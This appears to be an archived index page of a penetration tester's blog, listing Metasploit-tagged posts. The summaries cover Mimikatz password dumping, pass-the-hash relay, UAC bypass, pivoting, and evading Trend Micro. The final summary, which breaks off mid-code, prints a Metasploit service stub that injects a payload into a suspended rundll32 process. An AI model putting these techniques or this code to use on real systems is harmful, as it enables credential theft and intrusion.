<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <title>
    Metasploit // Room362
  </title>

  <link href="http://gmpg.org/xfn/11" rel="profile">
<meta http-equiv="content-type" content="text/html; charset=utf-8">


<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="">
<meta name="generator" content="Hugo 0.16" />

  <meta property="og:title" content="Metasploit" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="en_US" />
<meta property="og:url" content="https://room362.com/categories/metasploit/" />


  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
  
  
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
  
  

  <link rel="stylesheet" href="https://room362.com//css/redlounge.css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.png">

  
  <link href="https://room362.com/categories/metasploit/index.xml" rel="alternate" type="application/rss+xml" title="Room362" />

    
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
  
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>


  

  

  

  
</head>

<body>
	<div id="layout" class="pure-g">
    <div class="sidebar pure-u-1 pure-u-md-1-4">
  <div class="header">
    

	
	  <img src="/images/headshot_small.png" class="sidebarphoto">
	

    <h1 class="brand-title">Room362</h1>
    <h2 class="brand-tagline">Blatherings of a security addict</h2>

    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://room362.com/">Home</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/brandon/">Brandon</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/">About</a></li>
        
      </ul>
    </nav>

    
    <div class="social-buttons">
      
        
        <a href="/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
        
      
        
        <a href="https://linkedin.com/in/mubix" target="_blank"><i class='fa fa-linkedin'></i></a>
        
      
        
        <a href="https://twitter.com/mubix" target="_blank"><i class='fa fa-twitter'></i></a>
        
      
      
    </div>
    

  </div>
</div>


    <div class="content pure-u-1 pure-u-md-3-4">
      <a name="top"></a>
      

      <div class="posts">
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/">Installing Metasploit Community Edition on Windows 8</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>13</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jan</span> <span class="post-date-year">2014</span>
		          </span>
      				
      				
      					
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit-minute" href="https://room362.com//categories/metasploit-minute">metasploit minute</a>
      					
					        <a class="post-category post-category-presentations" href="https://room362.com//categories/presentations">presentations</a>
      					
					        <a class="post-category post-category-windows-8" href="https://room362.com//categories/windows-8">windows 8</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Show URL: Hak5 Youtube URL: YouTube Show RSS feed: RSS
            </article>
			<div class="read-more-link">
				<a href="/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/">Metasploit Minute - Mondays with Mubix - Episode 1</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>6</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jan</span> <span class="post-date-year">2014</span>
		          </span>
      				
      				
      					
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-hak5" href="https://room362.com//categories/hak5">hak5</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-presentations" href="https://room362.com//categories/presentations">presentations</a>
      					
					        <a class="post-category post-category-metasploit-minute" href="https://room362.com//categories/metasploit-minute">metasploit minute</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Show URL: Hak5 Youtube URL: YouTube Show RSS feed: RSS
            </article>
			<div class="read-more-link">
				<a href="/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/">Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>7</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Mimikatz is now built into Metasploit&rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-04-08-sessiondump-meterpreter-extension/">Sessiondump Meterpreter Extension</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>8</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Apr</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing. Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it: No blog post or huge Vegas lights talk on it at DefCon or Blackhat.
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-04-08-sessiondump-meterpreter-extension/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/">Metasploit Mastery @BlackHatEvents USA 2013</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>19</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Mar</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-training" href="https://room362.com//categories/training">training</a>
      					
					        <a class="post-category post-category-cons" href="https://room362.com//categories/cons">cons</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Just a quick post to say that egypt and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us Linky: http://www.blackhat.com/us-13/training/metasploit-mastery.html Current fill rate of July 27-28 session: Current fill rate of July 29-30 session: EOM
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/">Metasploit Mastery meets CanSecWest</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>25</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jan</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-training" href="https://room362.com//categories/training">training</a>
      					
					        <a class="post-category post-category-cansecwest" href="https://room362.com//categories/cansecwest">cansecwest</a>
      					
					        <a class="post-category post-category-cons" href="https://room362.com//categories/cons">cons</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	In 2012 @egypt and I taught Metasploit Mastery for a day and a half @DerbyCon . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries).
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/">EXE::Custom in Metasploit&#39;s Java Exploits</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>19</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Nov</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-java" href="https://room362.com//categories/java">java</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Let me say first off that this isn&rsquo;t the most elegant of ways to accomplish it. It is in the &ldquo;it works for me&rdquo; stage. A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-10-31-finding-admin-access/">Finding Admin Access</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>31</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>4 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	You&rsquo;ve got shell, and a set of credentials but you&rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin. (I&rsquo;m not trying to pull some some &ldquo;insert magic here&rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials) Enter the auxiliary module: auxiliary/admin/smb/check_dir_file First we set up a route as aux modules don&rsquo;t have a &ldquo;SESSION&rdquo; parameter: Use the module and set our credentials: Next, set ADMIN$ as we can&rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-10-31-finding-admin-access/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-10-30-bypassuac-got-a-facelift/">BypassUAC got a facelift</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>30</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-uac" href="https://room362.com//categories/uac">uac</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Dave Kennedy and Kevin Mitnick submitted the &ldquo;bypassuac&rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network. &ldquo;Old&rdquo; module post/windows/escalate/bypassuac: I decided to give it a bit of a face lift: &ldquo;New&rdquo; local exploit module exploit/windows/local/bypassuac: All of the credit for the availability of this module goes to @egyp7 though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&rsquo;t be possible.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-10-30-bypassuac-got-a-facelift/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/">Setting SYSTEM&#39;s proxy settings with Metasploit</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>21</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-proxy" href="https://room362.com//categories/proxy">proxy</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn&rsquo;t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you&rsquo;re done for right out of the door) Now, there is a stub in Metasploit that I have been unable to complete due to my lack of knowledge in the shell code world.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/">Mounting SMB shares over Meterpreter</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>17</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-smb" href="https://room362.com//categories/smb">smb</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Ok, this is pretty straight forward no magic: Got a shell, doesn&rsquo;t have to be SYSTEM Add a route to the internal range or directly to the host you want over the session you want Mosy on over to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. It defaults to 9050 on 127.0.01 for Tor, that&rsquo;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/">Meet “q” – Free Metasploit Exploit Pack</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>4</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Once you’re done staring at the Star Trek deity above (it’s a staring contest you will loose since you a such a simplistic race). I pull your attention to: https://github.com/mubix/q This repository / exploit pack was created for the sole purpose to house modules, scripts and resource files that would otherwise not be accepted into the Metasploit trunk. It will always be free and anyone is free to submit pulls of modules, scripts or resource files that they created or just found and were not accepted to the trunk because it was just a script, it violates TOS of a service, they did not author it, or any other possible reason.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/">Completely In-memory Mimikatz with Metasploit</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>6</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Sep</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk: (yes I realize I&rsquo;m running this on disk &lsquo;wce32.exe&rsquo;, but it exhibits the same DLL drop when doing in-memory) Now, don&rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&rsquo;s the best tool for the job.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-08-28-free-shells-with-plink-and-pageant/">Free Shells with Plink and Pageant</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>28</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Aug</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-putty" href="https://room362.com//categories/putty">putty</a>
      					
					        <a class="post-category post-category-ssh" href="https://room362.com//categories/ssh">ssh</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with: meterpreter &gt; run enum_putty [*] Putty Installed for [[&quot;Administrator&quot;]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter &gt; Awesome, this guy runs as root and we have the IP address.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-08-28-free-shells-with-plink-and-pageant/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/">Raising Zombies in Windows: Part 1 - Passwords</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>31</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jul</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-railgun" href="https://room362.com//categories/railgun">railgun</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&rsquo;t really appreciative of our (pentester/red teamer)&rsquo;s schedule. A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &lsquo;runas.exe&rsquo;: w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&rsquo;re good right?
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/">Cross-Protocol Chained Pass the Hash for Metasploit</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>10</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jul</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-pth" href="https://room362.com//categories/pth">pth</a>
      					
					        <a class="post-category post-category-smbrelay" href="https://room362.com//categories/smbrelay">smbrelay</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day: Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536 Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589 Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;resid=19794FAC33285FD5!170&amp;id=19794FAC33285FD5%21170 You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded): 163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Bypassing Trend Micro&#39;s Service Protection</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>5</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jul</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-trendmicro" href="https://room362.com//categories/trendmicro">trendmicro</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	@jabjorkhaug posed the following question on Twitter today: I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as: The service binary that is used as part of PSEXEC is located here: MSF Directory/data/templates/src/pe/exe/service/service.c The important part to look at starts at line 57: #define WIN32_LEAN_AND_MEAN #include &lt;windows.h&gt; #define PAYLOAD_SIZE 8192 char cServiceName[32] = &quot;SERVICENAME&quot;; char bPayload[PAYLOAD_SIZE] = &quot;PAYLOAD:&quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.dwWin32ExitCode = 0; ss.dwCurrentState = SERVICE_STOPPED; } return SetServiceStatus( hStatus, &amp;ss ); } /* * */ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors ) { CONTEXT Context; STARTUPINFO si; PROCESS_INFORMATION pi; LPVOID lpPayload = NULL; ZeroMemory( &amp;ss, sizeof(SERVICE_STATUS) ); ZeroMemory( &amp;si, sizeof(STARTUPINFO) ); ZeroMemory( &amp;pi, sizeof(PROCESS_INFORMATION) ); si.cb = sizeof(STARTUPINFO); ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS; ss.dwCurrentState = SERVICE_START_PENDING; ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN; hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler ); if ( hStatus ) { ss.dwCurrentState = SERVICE_RUNNING; SetServiceStatus( hStatus, &amp;ss ); if( CreateProcess( NULL, &quot;rundll32.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ) ) { Context.ContextFlags = CONTEXT_FULL; GetThreadContext( pi.hThread, &amp;Context ); lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE ); if( lpPayload ) { WriteProcessMemory( pi.hProcess, lpPayload, &amp;bPayload, PAYLOAD_SIZE, NULL ); #ifdef _WIN64 Context.Rip = (DWORD64)lpPayload; #else Context.Eip = (DWORD)lpPayload; #endif SetThreadContext( pi.hThread, &amp;Context ); } ResumeThread( pi.hThread ); CloseHandle( pi.hThread ); CloseHandle( pi.hProcess ); } ServiceHandler( SERVICE_CONTROL_STOP ); ExitProcess( 0 ); } } /* * */ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE 